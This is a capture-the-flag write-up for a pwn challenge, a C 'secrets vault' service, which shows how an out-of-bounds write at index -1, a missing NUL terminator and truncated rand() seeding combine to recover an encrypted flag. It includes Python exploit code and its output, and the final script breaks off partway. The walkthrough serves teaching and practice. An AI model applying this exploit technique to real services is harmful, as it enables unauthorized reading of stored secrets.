# Yet Another Security Service+

 * Category: Pwn
 * 250 Points
 * Solved by the JCTF Team

## Description

> Welcome to our new security services! You can trust us to keep your secrets safely on our online vault.

<details>
  <summary>Click to expand source code</summary>

Contents of `challenge.h`:

```c
#include <stddef.h>
#include <stdint.h>

#define SECRET_DATA_LEN 100
#define SECRET_ID_LEN 20
#define MAX_SECRETS 50
#define RES_MSG_LEN 150

#define PACKED __attribute__((__packed__))

#define ERROR -1
#define SUCCESS 0

struct PACKED meta
{
	uint8_t is_valid;
	uint8_t is_encrypted;
	uint64_t seed;
};

struct PACKED secret
{
	uint8_t secret_id[SECRET_ID_LEN];
	uint32_t reserved;
	uint8_t secret_data[SECRET_DATA_LEN];
};

struct PACKED context_t
{
	char reserved[10]; // meta meta data :) we'll maybe use that later
	struct meta meta_data[MAX_SECRETS];
	struct secret secret_list[MAX_SECRETS];
};

struct PACKED request
{
	uint8_t cmd;
	uint8_t secret_id[SECRET_ID_LEN];
};

struct PACKED request_params
{
	uint8_t is_encrypted;
	uint8_t secret_data[SECRET_DATA_LEN];
};

struct PACKED response
{
	char msg[RES_MSG_LEN];
};

enum commands
{
	SET_SECRET,
	UNSET_SECRET,
	GET_SECRET,
};

void server_main();

```

Contents of `challenge.c`:

```c
// in this challenge we use the musl implementation of libc
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include "challenge.h"

struct context_t context = {0};

// thanks chatgpt - that's probably fine :)
uint64_t get_rand_qword(void) {
	uint64_t random_byte;
	int random_fd = open("/dev/random", O_RDONLY);

	if (random_fd < 0) {
		perror("failed to open /dev/random");
		exit(1);
	}

	ssize_t bytes_read = read(random_fd, &random_byte, sizeof(random_byte));
	if (bytes_read < 0) {
		perror("failed to read /dev/random");
		close(random_fd);
		exit(1);
	}

	close(random_fd);
	return random_byte;
}

static int get_secret_index_from_list(uint8_t * secret_id)
{
	for (int i = 0; i < MAX_SECRETS; i++)
	{
		if (context.meta_data[i].is_valid == 0)
			continue;
		if (memcmp(context.secret_list[i].secret_id,
			   secret_id,
			   SECRET_ID_LEN) == 0)
			return i;
	}
	return ERROR;
}

static int get_free_secret_index()
{
	for (int i = 0; i < MAX_SECRETS; i++)
	{
		if(context.meta_data[i].is_valid == 0)
			return i;
	}
	return ERROR;
}

// if the given secret is encrypted then decrypt it
// if it's decrypted then encrypt it
static void encrypt_decrypt(int secret_id)
{
	srand(context.meta_data[secret_id].seed);
	for (int i = 0; i < SECRET_DATA_LEN; i++)
	{
		context.secret_list[secret_id].secret_data[i] ^= rand();
	}
	context.meta_data[secret_id].is_encrypted ^= 1;
}

// if the given secret exist in the database then override it,
// else, create a new secret in the database
static void set_secret(uint8_t* secret_id, uint8_t is_encrypted, uint8_t* secret_data,
		       struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);
	int secret_len = 0;

	if (idx == ERROR)
	{
		idx = get_free_secret_index();
	}

	// copy secret_id (bytes)
	memcpy(context.secret_list[idx].secret_id, secret_id, SECRET_ID_LEN);

	// copy secret content (string)
	secret_len = strnlen((char *)secret_data, SECRET_DATA_LEN);
	memcpy((char *)context.secret_list[idx].secret_data,
		(char *)secret_data,
		secret_len);
	if (secret_len < SECRET_DATA_LEN)
		context.secret_list[idx].secret_data[secret_len] = '\0';

	// mark entry as valid
	context.meta_data[idx].is_valid = 1;
	context.meta_data[idx].is_encrypted = 0;
	context.meta_data[idx].seed = get_rand_qword();
	// zero one byte from the seed as hardening so if someone manage to
	// print it, they won't get all of it
	context.meta_data[idx].seed &= 0xffffffff00ffffff;

	// encrypt if requested
	if(is_encrypted)
	{
		encrypt_decrypt(idx);
	}
	snprintf(res->msg, RES_MSG_LEN, "[+] done! don't forget your secret_id!");
}

static void get_secret(uint8_t* secret_id, struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);

	if (idx == ERROR || context.meta_data[idx].is_valid == 0)
	{
		snprintf(res->msg, RES_MSG_LEN, "[-] can't get secret, invalid secret_id");
		return;
	}

	if(!context.meta_data[idx].is_encrypted)
	{
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
	}
	else
	{
		encrypt_decrypt(idx); //decrypt
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
		encrypt_decrypt(idx); // encrypt
	}
}

static void unset_secret(uint8_t* secret_id, struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);

	if (idx == ERROR)
	{
		snprintf(res->msg, RES_MSG_LEN, "[-] can't unset secret, invalid secret_id");
		return;
	}

	context.meta_data[idx].is_valid = 0;
	context.meta_data[idx].is_encrypted = 0;
	context.meta_data[idx].seed = 0;
	memset(context.secret_list[idx].secret_id, 0, SECRET_ID_LEN);
	memset(context.secret_list[idx].secret_data, 0, SECRET_DATA_LEN);
	snprintf(res->msg, RES_MSG_LEN, "[+] done");
}

void process_request(struct request* req, struct request_params* req_params,
		     struct response * res)
{
	switch(req->cmd)
	{
		case GET_SECRET:
			get_secret(req->secret_id, res);
			break;
		case SET_SECRET:
			set_secret(req->secret_id, req_params->is_encrypted,
				   req_params->secret_data, res);
			break;
		case UNSET_SECRET:
			unset_secret(req->secret_id, res);
			break;
		default:
			snprintf(res->msg, RES_MSG_LEN, "[-] invalid command");
			break;
	}
}

size_t read_buffer(void* buffer, size_t size) {
	size_t nread = fread(buffer, 1, size, stdin);
	if (nread < size && nread > 0) {
		fprintf(stderr, "Bad readsize: %zu (connection dropped)\n", nread);
		return 0;
	}
	return nread;
}

void server_main()
{
	while(1)
	{
		struct request req = {0};
		struct request_params req_params = {0};
		struct response res = {0};

		printf(">> ");
		if (!read_buffer(&req, sizeof(req))) {
			break;
		}
		if (req.cmd == SET_SECRET) {
			if (!read_buffer(&req_params, sizeof(req_params)))
				break;
		}

		process_request(&req, &req_params, &res);
		puts(res.msg);
	}
}

```

</details>


## Solution

The attached program implements a *Secrets Service*, allowing users to store and read back
secrets based on a *Secret ID*. This is the second of three challenges which share the same
source code, and therefore the program contains multiple bugs. In this writeup, we'll focus
on the bug that's relevant for the second challenge, and explore the other bugs in the
other writeups.

Quick reminder: In the previous challenge we found out that we can leak Secret IDs of existing
entries by exploiting incorrect NULL-termination logic: If we set a secret with `SECRET_DATA_LEN`
characters and then read it back, the Secret ID of the subsequent secret gets leaked as well
due to the lack of a NULL-terminator between them.

For the current challenge, we'll need to exploit a few more vulnerabilities as well. But
let's start with what previously worked for us, by leaking the existing Secret IDs using
the original vulnerability.

<details>
  <summary>Click to expand output</summary>

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service+]
└─$ python3 exploit.py
[+] Opening connection to 0.cloud.chals.io on port 23242: Done
[*] Setting secret b's0' data to: b'....................................................................................................'
[*] Getting secret b's0' data
[*] Secret #s0 read back: ....................................................................................................
[*] Setting secret b's1' data to: b'....................................................................................................'
[*] Getting secret b's1' data
[*] Secret #s1 read back: ....................................................................................................
[*] Setting secret b's2' data to: b'....................................................................................................'
[*] Getting secret b's2' data
[*] Secret #s2 read back: ....................................................................................................
[*] Setting secret b's3' data to: b'....................................................................................................'
[*] Getting secret b's3' data
[*] Secret #s3 read back: ....................................................................................................
[*] Setting secret b's4' data to: b'....................................................................................................'
[*] Getting secret b's4' data
[*] Secret #s4 read back: ....................................................................................................
[*] Setting secret b's5' data to: b'....................................................................................................'
[*] Getting secret b's5' data
[*] Secret #s5 read back: ....................................................................................................
[*] Setting secret b's6' data to: b'....................................................................................................'
[*] Getting secret b's6' data
[*] Secret #s6 read back: ....................................................................................................
[*] Setting secret b's7' data to: b'....................................................................................................'
[*] Getting secret b's7' data
[*] Secret #s7 read back: ....................................................................................................
[*] Setting secret b's8' data to: b'....................................................................................................'
[*] Getting secret b's8' data
[*] Secret #s8 read back: ....................................................................................................
[*] Setting secret b's9' data to: b'....................................................................................................'
[*] Getting secret b's9' data
[*] Secret #s9 read back: ....................................................................................................
[*] Setting secret b's10' data to: b'....................................................................................................'
[*] Getting secret b's10' data
[*] Secret #s10 read back: ....................................................................................................
[*] Setting secret b's11' data to: b'....................................................................................................'
[*] Getting secret b's11' data
[*] Secret #s11 read back: ....................................................................................................
[*] Setting secret b's12' data to: b'....................................................................................................'
[*] Getting secret b's12' data
[*] Secret #s12 read back: ....................................................................................................
[*] Setting secret b's13' data to: b'....................................................................................................'
[*] Getting secret b's13' data
[*] Secret #s13 read back: ....................................................................................................
[*] Setting secret b's14' data to: b'....................................................................................................'
[*] Getting secret b's14' data
[*] Secret #s14 read back: ....................................................................................................
[*] Setting secret b's15' data to: b'....................................................................................................'
[*] Getting secret b's15' data
[*] Secret #s15 read back: ....................................................................................................
[*] Setting secret b's16' data to: b'....................................................................................................'
[*] Getting secret b's16' data
[*] Secret #s16 read back: ....................................................................................................flag is not here
[*] Leaked ID: 'flag is not here'
[*] Setting secret b's18' data to: b'....................................................................................................'
[*] Getting secret b's18' data
[*] Secret #s18 read back: ....................................................................................................
[*] Setting secret b's19' data to: b'....................................................................................................'
[*] Getting secret b's19' data
[*] Secret #s19 read back: ....................................................................................................
[*] Setting secret b's20' data to: b'....................................................................................................'
[*] Getting secret b's20' data
[*] Secret #s20 read back: ....................................................................................................
[*] Setting secret b's21' data to: b'....................................................................................................'
[*] Getting secret b's21' data
[*] Secret #s21 read back: ....................................................................................................
[*] Setting secret b's22' data to: b'....................................................................................................'
[*] Getting secret b's22' data
[*] Secret #s22 read back: ....................................................................................................
[*] Setting secret b's23' data to: b'....................................................................................................'
[*] Getting secret b's23' data
[*] Secret #s23 read back: ....................................................................................................
[*] Setting secret b's24' data to: b'....................................................................................................'
[*] Getting secret b's24' data
[*] Secret #s24 read back: ....................................................................................................
[*] Setting secret b's25' data to: b'....................................................................................................'
[*] Getting secret b's25' data
[*] Secret #s25 read back: ....................................................................................................
[*] Setting secret b's26' data to: b'....................................................................................................'
[*] Getting secret b's26' data
[*] Secret #s26 read back: ....................................................................................................
[*] Setting secret b's27' data to: b'....................................................................................................'
[*] Getting secret b's27' data
[*] Secret #s27 read back: ....................................................................................................
[*] Setting secret b's28' data to: b'....................................................................................................'
[*] Getting secret b's28' data
[*] Secret #s28 read back: ....................................................................................................
[*] Setting secret b's29' data to: b'....................................................................................................'
[*] Getting secret b's29' data
[*] Secret #s29 read back: ....................................................................................................
[*] Setting secret b's30' data to: b'....................................................................................................'
[*] Getting secret b's30' data
[*] Secret #s30 read back: ....................................................................................................
[*] Setting secret b's31' data to: b'....................................................................................................'
[*] Getting secret b's31' data
[*] Secret #s31 read back: ....................................................................................................
[*] Setting secret b's32' data to: b'....................................................................................................'
[*] Getting secret b's32' data
[*] Secret #s32 read back: ....................................................................................................
[*] Setting secret b's33' data to: b'....................................................................................................'
[*] Getting secret b's33' data
[*] Secret #s33 read back: ....................................................................................................
[*] Setting secret b's34' data to: b'....................................................................................................'
[*] Getting secret b's34' data
[*] Secret #s34 read back: ....................................................................................................
[*] Setting secret b's35' data to: b'....................................................................................................'
[*] Getting secret b's35' data
[*] Secret #s35 read back: ....................................................................................................
[*] Setting secret b's36' data to: b'....................................................................................................'
[*] Getting secret b's36' data
[*] Secret #s36 read back: ....................................................................................................
[*] Setting secret b's37' data to: b'....................................................................................................'
[*] Getting secret b's37' data
[*] Secret #s37 read back: ....................................................................................................
[*] Setting secret b's38' data to: b'....................................................................................................'
[*] Getting secret b's38' data
[*] Secret #s38 read back: ....................................................................................................null
[*] Leaked ID: 'null'
[*] Setting secret b's40' data to: b'....................................................................................................'
[*] Getting secret b's40' data
[*] Secret #s40 read back: ....................................................................................................
[*] Setting secret b's41' data to: b'....................................................................................................'
[*] Getting secret b's41' data
[*] Secret #s41 read back: ....................................................................................................flag is not here
[*] Leaked ID: 'flag is not here'
[*] Setting secret b's43' data to: b'....................................................................................................'
[*] Getting secret b's43' data
[*] Secret #s43 read back: ....................................................................................................
[*] Setting secret b's44' data to: b'....................................................................................................'
[*] Getting secret b's44' data
[*] Secret #s44 read back: ....................................................................................................
[*] Setting secret b's45' data to: b'....................................................................................................'
[*] Getting secret b's45' data
[*] Secret #s45 read back: ....................................................................................................
[*] Setting secret b's46' data to: b'....................................................................................................'
[*] Getting secret b's46' data
[*] Secret #s46 read back: ....................................................................................................
[*] Setting secret b's47' data to: b'....................................................................................................'
[*] Getting secret b's47' data
[*] Secret #s47 read back: ....................................................................................................
[*] Setting secret b's48' data to: b'....................................................................................................'
[*] Getting secret b's48' data
[*] Secret #s48 read back: ....................................................................................................
[*] Setting secret b's49' data to: b'....................................................................................................'
[*] Getting secret b's49' data
[*] Secret #s49 read back: ....................................................................................................
```

</details>


We can see three existing entries: Two are called "flag is not here" (like before), and a new
one is called "null". Might as well try to read it:

```python
secret = get_secret(b"null")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service+]
└─$ python3 exploit.py DEBUG
[+] Opening connection to 0.cloud.chals.io on port 23242: Done
[*] Getting secret b'null' data
[DEBUG] Sent 0x15 bytes:
    00000000  02 6e 75 6c  6c 00 00 00  00 00 00 00  00 00 00 00  │·nul│l···│····│····│
    00000010  00 00 00 00  00                                     │····│·│
    00000015
[DEBUG] Received 0x2e bytes:
    b">> [-] can't get secret, invalid secret_id\n"
    b'>> '
Traceback (most recent call last):
  File "/media/sf_CTFs/bsides/Yet_Another_Security_Service+/exploit.py", line 136, in <module>
    secret = get_secret(b"null")
             ^^^^^^^^^^^^^^^^^^^
  File "/media/sf_CTFs/bsides/Yet_Another_Security_Service+/exploit.py", line 132, in get_secret
    raise RuntimeError(f"Can't read secret {secret_id}")
RuntimeError: Can't read secret b'null'
[*] Closed connection to 0.cloud.chals.io port 23242
```

As expected, this doesn't work. We can assume that the reason is that the Secret ID contains
a NULL character after the "null" string, which is preventing it from being leaked using
our current method. And, without the full Secret ID, we can't use the public API to read
its content.

So, what do we do now? We need to identify a new vulnerability. And this new vulnerability
exists in `set_secret` as well:

```c
	int idx = get_secret_index_from_list(secret_id);
	int secret_len = 0;

	if (idx == ERROR)
	{
		idx = get_free_secret_index();
	}

	// copy secret_id (bytes)
	memcpy(context.secret_list[idx].secret_id, secret_id, SECRET_ID_LEN);
```

Let's follow the logic for selecting `idx`. We start by calling `get_secret_index_from_list`, 
which will return `ERROR` if it can't find the provided `secret_id` (for example, if it
doesn't exist). In such a case, we go ahead and call `get_free_secret_index` to find a new
slot to store the secret in, but what happens if no remaining free slots exist?

```c
static int get_free_secret_index()
{
	for (int i = 0; i < MAX_SECRETS; i++)
	{
		if(context.meta_data[i].is_valid == 0)
			return i;
	}
	return ERROR;
}
```

If we're out of free slots, the function will return `ERROR` as well, leading to `idx` containing
the value of `ERROR` for the remainder of the function. And what is the value of `ERROR`? 
Luckily for us, it's `-1`, allowing us to make some unintended changes to the global context.

Let's review `set_secret` and list the global context members it modifies:

```c
context.secret_list[idx].secret_id;
context.secret_list[idx].secret_data;
context.meta_data[idx].is_valid;
context.meta_data[idx].is_encrypted;
context.meta_data[idx].seed;
```

So for each of these members, we can write *something* to the `-1` index of the array. What
does this give us? 

Well, for `meta_data[-1]`, the bad news is that this maps to the context's `reserved` field,
which means that there's nothing useful that we can do with it. On the positive side, at least 
we can be sure that we won't crash the program by writing over some critical runtime data.

```c
struct PACKED context_t
{
	char reserved[10]; // meta meta data :) we'll maybe use that later
	struct meta meta_data[MAX_SECRETS];
	struct secret secret_list[MAX_SECRETS];
};
```

As for `secret_list[-1]`, this is where the fun starts. Using this out-of-bounds write,
we can overwrite the metadata for some secrets. To figure out which exactly, we can perform
some pointer-arithmetic, or visualize it with the following program:

<details>
  <summary>Click to expand code</summary>

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

#define SECRET_DATA_LEN 100
#define SECRET_ID_LEN 20
#define MAX_SECRETS 50
#define RES_MSG_LEN 150

#define PACKED __attribute__((__packed__))

struct PACKED meta
{
	uint8_t is_valid;
	uint8_t is_encrypted;
	uint64_t seed;
};

struct PACKED secret
{
	uint8_t secret_id[SECRET_ID_LEN];
	uint32_t reserved;
	uint8_t secret_data[SECRET_DATA_LEN];
};

struct PACKED context_t
{
	char reserved[10]; // meta meta data :) we'll maybe use that later
	struct meta meta_data[MAX_SECRETS];
	struct secret secret_list[MAX_SECRETS];
};

#define HEXDUMP_COLS 10

// https://gist.github.com/richinseattle/c527a3acb6f152796a580401057c78b4
void hexdump(void *mem, unsigned int len)
{
        unsigned int i, j;
        
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
        {
                /* print offset */
                if(i % HEXDUMP_COLS == 0)
                {
                        printf("%02d: ", i / 10);
                }
 
                /* print hex data */
                if(i < len)
                {
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                }
                else /* end of block, just aligning for ASCII dump */
                {
                        printf("   ");
                }
                
                /* print ASCII dump */
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
                {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
                        {
                                if(j >= len) /* end of block, not really printing */
                                {
                                        putchar(' ');
                                }
                                else if(isprint(((char*)mem)[j])) /* printable char */
                                {
                                        putchar(0xFF & ((char*)mem)[j]);        
                                }
                                else /* other char */
                                {
                                        putchar('.');
                                }
                        }
                        putchar('\n');
                }
        }
}

int main()
{
    int idx = -1;
    int secret_len = 0;
    
    struct context_t context = {0};
    
    char* secret_id = "AAAAAAAAAAAAAAAAAAAA";
    char* secret_data = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    
    // copy secret_id (bytes)
	memcpy(context.secret_list[idx].secret_id, secret_id, SECRET_ID_LEN);

	// copy secret content (string)
	secret_len = strnlen((char *)secret_data, SECRET_DATA_LEN);
	memcpy((char *)context.secret_list[idx].secret_data,
		(char *)secret_data,
		secret_len);
	if (secret_len < SECRET_DATA_LEN)
		context.secret_list[idx].secret_data[secret_len] = '\0';

    hexdump(context.meta_data, sizeof(context.meta_data));

    return 0;
}
```

</details>

Output:

```c
00: 00 00 00 00 00 00 00 00 00 00 ..........
01: 00 00 00 00 00 00 00 00 00 00 ..........
02: 00 00 00 00 00 00 00 00 00 00 ..........
03: 00 00 00 00 00 00 00 00 00 00 ..........
04: 00 00 00 00 00 00 00 00 00 00 ..........
05: 00 00 00 00 00 00 00 00 00 00 ..........
06: 00 00 00 00 00 00 00 00 00 00 ..........
07: 00 00 00 00 00 00 00 00 00 00 ..........
08: 00 00 00 00 00 00 00 00 00 00 ..........
09: 00 00 00 00 00 00 00 00 00 00 ..........
10: 00 00 00 00 00 00 00 00 00 00 ..........
11: 00 00 00 00 00 00 00 00 00 00 ..........
12: 00 00 00 00 00 00 00 00 00 00 ..........
13: 00 00 00 00 00 00 00 00 00 00 ..........
14: 00 00 00 00 00 00 00 00 00 00 ..........
15: 00 00 00 00 00 00 00 00 00 00 ..........
16: 00 00 00 00 00 00 00 00 00 00 ..........
17: 00 00 00 00 00 00 00 00 00 00 ..........
18: 00 00 00 00 00 00 00 00 00 00 ..........
19: 00 00 00 00 00 00 00 00 00 00 ..........
20: 00 00 00 00 00 00 00 00 00 00 ..........
21: 00 00 00 00 00 00 00 00 00 00 ..........
22: 00 00 00 00 00 00 00 00 00 00 ..........
23: 00 00 00 00 00 00 00 00 00 00 ..........
24: 00 00 00 00 00 00 00 00 00 00 ..........
25: 00 00 00 00 00 00 00 00 00 00 ..........
26: 00 00 00 00 00 00 00 00 00 00 ..........
27: 00 00 00 00 00 00 00 00 00 00 ..........
28: 00 00 00 00 00 00 00 00 00 00 ..........
29: 00 00 00 00 00 00 00 00 00 00 ..........
30: 00 00 00 00 00 00 00 00 00 00 ..........
31: 00 00 00 00 00 00 00 00 00 00 ..........
32: 00 00 00 00 00 00 00 00 00 00 ..........
33: 00 00 00 00 00 00 00 00 00 00 ..........
34: 00 00 00 00 00 00 00 00 00 00 ..........
35: 00 00 00 00 00 00 00 00 00 00 ..........
36: 00 00 00 00 00 00 00 00 00 00 ..........
37: 00 00 00 00 00 00 41 41 41 41 ......AAAA
38: 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAA
39: 41 41 41 41 41 41 00 00 00 00 AAAAAA....
40: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
41: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
42: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
43: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
44: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
45: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
46: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
47: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
48: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
49: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
```

So, this means that we can overwrite the 4 MSB bytes of `meta_data[37].seed`, 
all of `meta_data[38]`, and the first 4 bytes of `meta_data[39]` (which are the valid bit,
the encryption bit and the 4 LSB bytes of the seed).  
We also have full control of `meta_data[40] - meta_data[49]`.

This is great, since this allows us to (partially) control the metadata for our "null" entry,
which resides at index 39. We know that since it got leaked when we were reading back 
secret #38.

So here's the plan. First, we're going to fill up the secrets array with 47 additional
secrets, so that it's full. Then, we're going to attempt to write a new secret, which
will get written to `idx = -1`, meaning that it will allow us to partially override 
`meta_data[39]`'s data. We'll zero its valid bit. Then, we'll try to save a new secret, with
a new name, and `0x00` as data. It will get saved to the first free entry, which is the one
we just tricked into being free, #39. The fact that we're sending `0x00` as the data ensures
that the existing data won't be overwritten, since `set_secret` copies the data up to the 
`strnlen` of the `secret_data`, which is `0` in this case.

Let's try it:

```python
	# ... fill the array ...

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],              # Last 4 bytes of meta_data[37].seed
        MetaData(0x1, 0x0, 0x0).to_bytes(),                  # meta_data[38]: Valid,   Unencrypted, seed = 0
        MetaData(0x0, 0x0, 0x0).to_bytes()[:6]               # meta_data[39]: Invalid, Unencrypted, seed LSB = 0
    ])
    secret_data = bytearray(MetaData(0x1, 0x0, 0x0)) * 10    # Doesn't matter
    set_secret(secret_id, False, secret_data)

    secret_id_replacement = b'SECRETID_REPLACEMENT'

    # Write "SECRETID_REPLACEMENT" to secret_list[39].secret_id, overwriting "null"
    # secret_list[39].secret_data is unchanged
    set_secret(secret_id_replacement, False, b"\x00" * 100)

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],               # Last 4 bytes of meta_data[37].seed (doesn't matter)
        MetaData(0x1, 0x0, 0x0).to_bytes(),                   # meta_data[38]: Valid, Unencrypted, seed = 0 (doesn't matter)
        MetaData(0x1, 0x0, 0x0).to_bytes()[:6]                # meta_data[39]: Valid, Unencrypted, seed LSB = 0x02020202
    ])
    secret_data = bytearray(MetaData(0x1, 0x0, 0x0)) * 10    # Doesn't matter
    set_secret(secret_id, False, secret_data)

    secret = get_secret(secret_id_replacement)
    if (len(secret) == 0):
        log.info(f"Got empty secret")
    else:
        log.info(f"Got secret:\n{hexdump(secret)}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service+]
└─$ python3 exploit.py
[+] Opening connection to 0.cloud.chals.io on port 23242: Done
[*] Leaked ID: 'flag is not here'
[*] Leaked ID: 'null'
[*] Leaked ID: 'flag is not here'
[*] Got empty secret
[*] Closed connection to 0.cloud.chals.io port 23242
```

It didn't work! We got back an empty secret. The logical explanation for this behavior is 
that also the secret data stars with a NULL terminator, so it doesn't get copied back to
us in the response by `snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);`.  
This makes you wonder what's the point of storing a secret that starts with a NULL terminator 
in such a service in the first place, but that's not really up to us...

Anyway, to overcome this problem, we might be able to use the *encryption* feature of the service.  
We'll trick the service to believe that the entry is encrypted, which will cause the program
to try and "decrypt" it before sending it back. And, since the encryption and decryption
is XOR based, it is symmetric, so this in fact will "XOR-encrypt" the data before sending it
to us, and with some luck, eliminate the NULL characters that are preventing us from receiving
the content.

```c
	if(!context.meta_data[idx].is_encrypted)
	{
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
	}
	else
	{
		encrypt_decrypt(idx); //decrypt
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
		encrypt_decrypt(idx); // encrypt
	}
```

Let's try that:

```python
secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],              # Last 4 bytes of meta_data[37].seed
        MetaData(0x1, 0x0, 0x0).to_bytes(),                  # meta_data[38]: Valid,   Unencrypted, seed = 0
        MetaData(0x0, 0x0, 0x0).to_bytes()[:6]               # meta_data[39]: Invalid, Unencrypted, seed LSB = 0
    ])
    secret_data = bytearray(MetaData(0x1, 0x0, 0x0)) * 10    # Doesn't matter
    set_secret(secret_id, False, secret_data)

    secret_id_replacement = b'SECRETID_REPLACEMENT'

    # Write "SECRETID_REPLACEMENT" to secret_list[39].secret_id, overwriting "null"
    # secret_list[39].secret_data is unchanged
    set_secret(secret_id_replacement, False, b"\x00" * 100)

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],               # Last 4 bytes of meta_data[37].seed (doesn't matter)
        MetaData(0x1, 0x0, 0x0).to_bytes(),                   # meta_data[38]: Valid, Unencrypted, seed = 0 (doesn't matter)
        MetaData(0x1, 0x1, 0xFFFFFFFF02020202).to_bytes()[:6] # meta_data[39]: Valid, Unencrypted, seed LSB = 0x02020202
    ])
    secret_data = bytearray(MetaData(0x1, 0x0, 0x0)) * 10    # Doesn't matter
    set_secret(secret_id, False, secret_data)

    secret = get_secret(secret_id_replacement)
    if (len(secret) == 0):
        log.info(f"Got empty secret")
    else:
        log.info(f"Got secret:\n{hexdump(secret)}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service+]
└─$ python3 exploit.py
[+] Opening connection to 0.cloud.chals.io on port 23242: Done
[*] Leaked ID: 'flag is not here'
[*] Leaked ID: 'null'
[*] Leaked ID: 'flag is not here'
[*] Got secret:
    00000000  77 86 43 78  2b e5 c2 82  d3 d2 3b 17  7f bf 8b fc  │w·Cx│+···│··;·│····│
    00000010  9d 7a 9c 54  de 67 3a 62  0e 56 03 40  ab de db 1f  │·z·T│·g:b│·V·@│····│
    00000020  e5 e2 d4 2c  30 4c 23 56  b6 0f 3e a0  4c 82 ae d7  │···,│0L#V│··>·│L···│
    00000030  b5 e6 9e e9  04 46 1b 29  c6 f3 37 f3  c5 f5 b0 d8  │····│·F·)│··7·│····│
    00000040  e6 fe 6d 9a                                         │··m·│
    00000044
[*] Closed connection to 0.cloud.chals.io port 23242
```

Great! We got something back! But it's encrypted, how do we decrypt it?  
It's true that we control part of the `uint64_t seed` (the 4-byte LSB), but we can't modify
the 4-byte MSB since that area is exactly mapped to the 4-byte gap created by 
`struct secret.reserved`. We can see it clearly in the memory map visualization:

```
38: 01 00 00 00 00 00 00 00 00 00 AAAAAAAAAA
39: 00 00 55 55 55 55 00 00 00 00 AAAAAA.... // <-- The bottom 4 bytes aren't affected by our patterns
40: 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBB
```

Luckily, there's one last flaw we can exploit to recover the flag. Take a look at the following
logic:

```c
static void encrypt_decrypt(int secret_id)
{
	srand(context.meta_data[secret_id].seed);
	for (int i = 0; i < SECRET_DATA_LEN; i++)
	{
		context.secret_list[secret_id].secret_data[i] ^= rand();
	}
	context.meta_data[secret_id].is_encrypted ^= 1;
}
```

The `seed` is sent to `srand` to initialize the random number generator, but remember that
`srand`'s signature is `void srand(unsigned int seed)`, which (usually) means that it accepts
only 4 bytes as input! Fortunately, these are the four bytes we control!  
And given that `rand`'s behavior is predictable for a given `srand` seed, we can reproduce
the stream of bytes returned by `rand()` to recreate the key.

Now, if you're lucky, you're implementing the exploit on an environment containing the same
LIBC as the one for the CTF, and you can just call your local `srand` and `rand` to recreate the
same key stream. However, we weren't lucky, and our local LIBC implementation was different, 
so instead of tracking down the correct one, we used one last trick: We set entry #38's seed
to the same one as entry #39's seed (e.g. 0x02020202) and encrypted the data we previously 
set to entry #38. Once we got the encrypted version of the data, we could XOR it with the 
original data we wrote to extract the key. Then, we just needed to apply it to entry #39's
encrypted content to recover the flag.

Here's the full script:

```python
# First, generate a pwntools template via:
# $ pwn template --host 0.cloud.chals.io --port 23242

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import re

from enum import Enum
from ctypes import *

SECRET_DATA_LEN = 100
SECRET_ID_LEN   = 20
MAX_SECRETS     = 50

class Commands(Enum):
	SET_SECRET = 0
	UNSET_SECRET = 1
	GET_SECRET = 2

class Request(Structure):
    _pack_ = 1
    _fields_ = [
        ('cmd',       c_uint8),
        ('secret_id', c_uint8 * SECRET_ID_LEN)
    ]

class RequestParams(Structure):
    _pack_ = 1
    _fields_ = [
        ('is_encrypted', c_uint8),
        ('secret_data',  c_uint8 * SECRET_DATA_LEN)
    ]

class MetaData(Structure):
    _pack_ = 1
    _fields_ = [
        ('is_valid',      c_uint8),
        ('is_encrypted',  c_uint8),
        ('seed',          c_uint64)
    ]

    def to_bytes(self):
        return bytearray(self)

io = start()

def send_command(command):
    io.send(command)
    io.recvuntil(b">> ")
    return io.recvline(keepends=False)

def set_secret(secret_id, is_encrypted, secret_data):
    if len(secret_id) > SECRET_ID_LEN:
        raise ValueError("Secret ID Length too long")
    if len(secret_data) > SECRET_DATA_LEN:
